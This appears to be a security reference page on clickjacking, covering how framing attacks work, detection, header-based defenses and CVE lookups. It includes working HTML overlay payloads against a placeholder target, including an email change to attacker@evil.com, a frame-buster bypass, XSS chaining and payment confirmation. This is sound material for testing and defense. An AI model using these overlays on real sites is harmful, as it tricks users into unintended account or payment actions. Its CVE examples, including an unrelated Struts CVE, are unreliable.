# Clickjacking

> Invisible framing tricks a user into clicking actions on a target site. **Deep dive:** [`Troubleshooting_Guide/clickjacking.md`](../../../../Troubleshooting_Guide/clickjacking.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** UI redress
**Status:** complete

## What it is
Clickjacking (UI redressing) loads a target site in a transparent or disguised iframe over an
attacker page, so the victim believes they are interacting with the attacker's content while their
clicks actually land on the framed application. The victim performs a sensitive action without
realizing it.

## How it works
The attacker stacks the target inside an `<iframe>` made nearly invisible (`opacity`, sizing,
`z-index`) and positions a decoy element so the enticing button lines up with a real control on the
framed page. When the victim clicks the decoy, the click is delivered to the target, which still
carries the victim's session cookies — and any CSRF token in the framed page rides along
automatically, so CSRF defenses do not help. It works wherever the target permits framing: i.e. it
sends no `X-Frame-Options` and no CSP `frame-ancestors`, or those are misconfigured.

## Impact
The attacker induces any action a single (or few) click can trigger: changing account settings,
confirming a payment, granting an OAuth scope, liking/following ("likejacking"), or — when prefilled
via URL params — committing attacker-chosen values. Severity depends on the framed action; usually
medium, higher when chained (e.g. to DOM XSS) or against money/account flows.

## How to detect
- Sensitive pages respond without `X-Frame-Options: DENY/SAMEORIGIN` and without CSP
  `frame-ancestors` (`curl -I … | grep -i x-frame` confirms quickly).
- The page loads successfully inside a test iframe on a foreign origin.
- Actions are driven by GET/URL parameters, making single-click prefilled attacks possible.
- Any client-side "frame buster" present is bypassable (sandbox without `allow-scripts`, or
  double-framing against `top.location`).

## Exploitation (summary)
Frame the target, overlay a decoy aligned with the real control, and lure the victim to click;
prefill state via URL params so one click commits the action, and stack multiple decoys for
confirmation flows. Defeat JS frame-busters with `sandbox="allow-forms"` or double-framing, and
chain into reflected/DOM XSS where the framed form reflects a payload. Full payloads live in the
Payloads section above.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Basic overlay
A near-invisible iframe stacked over a decoy; the victim's click lands on the framed action,
and any CSRF token rides along automatically.
```html
<style>
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
  div    { position: absolute; top: 300px; left: 60px; z-index: 1; }
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account"></iframe>
```

### Prefilling the action
Drive the target's state via URL parameters so a single click commits it.
```html
<iframe src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
<div style="position:absolute;top:330px;left:60px;">Click me</div>
```

### Multistep / confirmation flows
Stack multiple decoys for two-step confirm dialogs.
```html
<style>
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.0001; z-index: 2; }
  .firstClick, .secondClick { position: absolute; z-index: 1; }
  .firstClick  { top: 330px; left: 50px; }
  .secondClick { top: 285px; left: 225px; }
</style>
<div class="firstClick">Click first</div>
<div class="secondClick">Click second</div>
<iframe src="https://TARGET/my-account"></iframe>
```

### Frame-buster bypass
```html
<!-- sandbox without allow-scripts disables JS frame-busters but keeps form POST -->
<iframe sandbox="allow-forms" src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
<div style="position:absolute;top:330px;left:60px;">Click me</div>
```
Against a `top.location` buster, nest the target inside a second iframe so the redirect only
moves the middle frame, not the attacker's top window (double-framing).

### Chaining with DOM XSS
The click triggers a form submission that reflects an XSS payload into the page.
```html
<iframe src="https://TARGET/feedback?name=<img src=1 onerror=alert(document.domain)>&email=a@b.com&subject=x&message=x#feedbackResult"></iframe>
<div style="position:absolute;top:50px;left:50px;">Submit Feedback</div>
```

### Likejacking & mobile variants
```html
<!-- social like/share widget under a decoy button -->
<iframe src="https://facebook.com/plugins/like.php?href=attacker-page"
        style="opacity:0.0001;position:absolute;z-index:2;width:100px;height:50px;"></iframe>
<button style="position:absolute;z-index:1;">Win a prize!</button>
```
```html
<!-- touchscreen: shrink the frame and capture the whole viewport -->
<style>iframe { transform: scale(0.1); opacity: 0; pointer-events: all; }</style>
<iframe src="https://TARGET/payment?confirm=true"></iframe>
<button style="position:fixed;top:0;left:0;width:100%;height:100%;">Free Gift!</button>
```

### Recon
```bash
curl -I https://TARGET/sensitive-page | grep -iE "x-frame|content-security"
# No X-Frame-Options and no CSP frame-ancestors -> likely framable
```

| Attribute | Effect |
|-----------|--------|
| `opacity: 0.0001` | nearly invisible iframe |
| `z-index: 2` | iframe sits over the decoy |
| `sandbox="allow-forms"` | kills JS busters, keeps form POST |
| `pointer-events: all` | captures all clicks |
| `transform: scale(0.1)` | shrink frame for precise targeting |

## Defenses
1. **CSP `frame-ancestors`** — set `frame-ancestors 'none'` (or an explicit allowlist) on all
   responses; this is the modern, primary control.
2. **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) for legacy-browser coverage, sent alongside CSP.
3. **`SameSite` cookies** so the framed request doesn't carry the session in a cross-site context.
4. Where embedding is required, scope it tightly and avoid client-side frame-busting JS as the sole
   defense — it is bypassable; rely on the response headers above.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Clickjacking
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Clickjacking
- **Exploit-DB** — https://www.exploit-db.com/search?q=Clickjacking
- **GitHub Advisories** — https://github.com/advisories?query=Clickjacking
- **OSV** — https://osv.dev/list?q=Clickjacking
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Clickjacking <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2017-5638`-era aside, clickjacking is usually reported as a missing-header weakness
  (CWE-1021) rather than a product CVE; many bug-bounty reports cite absent `X-Frame-Options`.
- `CVE-2015-1241` — Chrome UI-redress / clickjacking-adjacent issue allowing cross-origin tap
  hijacking on touch devices.
- _Canonical example: the 2011 Facebook "likejacking" worms that framed the Like button under decoy
  content to spread spam._

## References
- PortSwigger Web Security Academy — Clickjacking (UI redressing).
- OWASP — Clickjacking Defense Cheat Sheet.
- W3C CSP — `frame-ancestors` directive (CSP Level 2/3).
